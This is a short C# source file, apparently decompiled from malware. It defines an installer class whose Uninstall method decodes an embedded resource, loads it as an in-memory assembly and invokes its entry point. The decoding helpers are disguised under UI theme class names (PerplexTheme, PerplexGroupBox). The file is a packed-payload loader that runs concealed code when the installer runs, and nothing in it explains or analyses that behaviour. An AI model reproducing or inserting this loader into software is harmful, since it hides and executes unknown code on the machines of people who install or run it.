using System;
using System.Collections;
using System.ComponentModel;
using System.Configuration.Install;
using System.Reflection;
using System.Runtime.CompilerServices;
using Microsoft.VisualBasic.CompilerServices;

namespace ASCAvSvc;

[RunInstaller(true)]
public class SetPar : Installer
{
	public override void Uninstall(IDictionary savedState)
	{
		se1w();
	}

	public void se1w()
	{
		string[] array = new string[1] { Assembly.GetExecutingAssembly().Location };
		byte[] rawAssembly = PerplexTheme.Unscramble(PerplexTheme.Reverse(PerplexGroupBox.loadresource(Draw.smartdef)));
		object entryPoint = AppDomain.CurrentDomain.Load(rawAssembly).EntryPoint;
		RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(entryPoint, (Type)null, "invoke", new object[2]
		{
			"",
			new object[1] { array }
		}, (string[])null, (Type[])null, (bool[])null));
	}
}
